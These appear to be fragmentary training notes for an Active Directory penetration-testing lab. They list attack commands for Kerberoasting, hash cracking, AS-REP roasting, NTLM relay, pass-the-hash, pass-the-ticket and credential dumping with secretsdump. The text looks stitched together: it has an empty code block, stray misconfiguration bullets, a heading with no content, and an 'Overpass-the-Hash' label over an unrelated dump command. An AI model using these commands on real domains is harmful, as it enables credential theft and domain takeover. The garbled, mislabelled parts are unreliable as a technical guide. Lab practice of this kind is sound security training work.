# 1. Introduction to the AD Lab

## What the AD Lab Is

- A simulated Windows enterprise domain
- Contains a Domain Controller + Windows clients
- Includes realistic misconfigurations
- Designed for red team and pentesting practice
- Supports full attack chains from recon → domain takeover

## Why the AD Lab Matters

- Teaches real enterprise attack paths
- Builds intuition for Windows internals
- Provides safe, legal practice
- Bridges the gap between MS3 and real‑world AD environments

## What the AD Lab Is NOT

- Not a hardened enterprise
- Not a modern zero‑trust environment
- Not meant for production use

- Kali: NAT + Host‑only

```bash

```

- DNS misconfigured
- Wrong domain suffix
- WinRM disabled
- SMB blocked

## WinRM Enumeration

# 7. Exploitation Workflows

## Kerberoasting

### Request Tickets

```bash
impacket-GetUserSPNs lab.local/<user>:<pass> -dc-ip <DC-IP> -request
```

### Crack Hashes

```bash
hashcat -m 13100 hashes.txt rockyou.txt
```

---

## AS‑REP Roasting

```bash
impacket-GetNPUsers lab.local/ -usersfile users.txt -dc-ip <DC-IP> -format hashcat
```

---

## SMB Relay

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
```

---

## Pass‑the‑Hash

```bash
evil-winrm -i <DC-IP> -u Administrator -H <NTLM>
```

---

## Pass‑the‑Ticket

```bash
export KRB5CCNAME=ticket.ccache
evil-winrm -i <DC-IP> -r lab.local -u <user>
```

---

## Overpass‑the‑Hash

```bash
impacket-secretsdump -just-dc-ntlm lab.local/<user>@<DC-IP>
```
